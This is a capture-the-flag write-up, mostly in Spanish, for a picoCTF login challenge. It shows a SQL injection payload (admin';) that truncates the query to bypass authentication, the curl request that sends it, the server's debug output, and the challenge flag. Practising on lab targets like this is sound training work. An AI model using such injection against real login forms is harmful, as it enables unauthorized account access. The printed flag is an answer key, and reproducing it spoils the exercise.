## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

## Solución
En este nivel la solución fue bastante similar, ahora lo que cambió fue que el sitio web ya validaba los caracteres de =, or y 1, pero no que nosotros pudieramos hacer un select simplemente al usuario admin, ingresando admin';
De tal manera al ser concatenado en la sentencia SQL, el resutlado iba a ser:
```sql
SELECT * FROM users WHERE name='admin';'
```

Ignorando lo que está después del ; y permitiéndonos el acceso a el sitio

```powershell
C:\Users\Miguel García>curl -s https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';&debug=1"
<pre>username: admin';
password:
SQL query: SELECT * FROM users WHERE name='admin';' AND password=''
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>
C:\Users\Miguel García>

```

## Bandera
picoCTF{m0R3_SQL_plz_fa983901}

## Notas

## Referencias